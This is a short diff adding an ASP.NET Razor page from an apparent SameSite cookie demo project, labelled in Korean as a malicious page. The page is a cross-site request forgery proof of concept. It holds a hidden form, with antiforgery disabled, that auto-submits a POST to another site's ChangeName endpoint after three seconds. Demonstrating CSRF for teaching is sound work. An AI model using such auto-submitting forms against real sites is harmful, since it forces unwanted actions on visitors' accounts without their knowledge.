@@ -1,0 +1,16 @@
+﻿@page
+@model samesitedemo.Pages.PostAttackModel
+@{
+}
+
+<div id="wrap">
+    <h1>악성 페이지 - 3초 뒤 숨겨진 폼(form) 전송</h1>
+    <form asp-antiforgery="false" action="https://pwcqwer.com/api/ChangeName" method="POST">
+        <input type="hidden" id="name" name="PostAttack" value="Attacked!!!!"/>
+    </form>
+    <script>
+        setTimeout(function () {
+            document.forms[0].submit();
+        }, 3000);
+    </script>
+</div>
